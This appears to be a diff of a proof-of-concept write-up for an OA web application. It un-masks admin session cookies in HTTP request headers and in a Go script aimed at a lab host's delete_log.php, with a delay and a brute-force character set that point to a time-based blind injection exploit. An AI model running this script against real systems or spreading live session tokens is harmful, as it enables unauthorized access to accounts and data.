@@ -157,7 +157,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
-Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=p************************1
+Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp1
 Cache-Control: max-age=0
 
 
@@ -210,7 +210,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
-Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=b************************0
+Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=brpsncea78tf3qv8jgpdr69d20
 Cache-Control: max-age=0
 
 
@@ -245,7 +245,7 @@ func main() {
 
  url := "http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php"                                                                                     // 目标网站的URL
  delay := 2                                                                                                                                                          // 延迟时间，单位为秒
- cookieValue := "Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=p************************1" // 替换为有效的Cookie值
+ cookieValue := "Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1" // 替换为有效的Cookie值
 
  characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()+-" // 可能的字符集
 
